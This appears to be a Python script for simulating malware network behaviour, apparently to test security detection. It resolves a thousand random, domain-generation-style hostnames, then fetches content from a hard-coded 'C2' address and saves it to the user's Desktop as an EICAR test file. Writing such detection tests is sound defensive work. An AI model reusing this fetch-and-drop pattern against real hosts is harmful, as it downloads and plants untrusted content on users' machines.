import random
import string
import socket
import requests
import os
import logging
import time

# Configure logging for verbose output
logging.basicConfig(level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')

def generate_domain(length=8):
    # Generate a random domain name and TLD
    name_length = random.randint(5, 10)
    tld_length = random.randint(2, 3)
    domain_name = ''.join(random.choices(string.ascii_lowercase + string.digits, k=name_length))
    tld = ''.join(random.choices(string.ascii_lowercase, k=tld_length))
    domain = f"{domain_name}.{tld}"
    logging.debug(f"Generated domain: {domain}")
    return domain

def send_dns_queries(num_queries=500, sleep_time=0.01):
    for _ in range(num_queries):
        domain = generate_domain()
        try:
            socket.gethostbyname(domain)
            logging.info(f"Queried domain: {domain}")
        except socket.gaierror as e:
            logging.warning(f"Failed to query domain {domain}: {e}")
        time.sleep(sleep_time)

def simulate_c2_communication():
    c2_server = "http://11.11.11.10:8888/c2"
    try:
        response = requests.get(c2_server)
        logging.debug(f"C2 server response: {response.status_code}")
        if response.status_code == 200:
            malware_path = os.path.join(os.path.expanduser('~'), 'Desktop', 'eicar.com')
            with open(malware_path, 'wb') as file:
                file.write(response.content)
            logging.info("Malware file downloaded and placed on the desktop.")
        else:
            logging.warning(f"Unexpected response from C2 server: {response.status_code}")
    except requests.RequestException as e:
        logging.error(f"Failed to communicate with C2 server: {e}")

if __name__ == "__main__":
    logging.info("Starting DGA simulation...")
    send_dns_queries(num_queries=1000, sleep_time=0.01)
    simulate_c2_communication()
    logging.info("DGA simulation completed.")
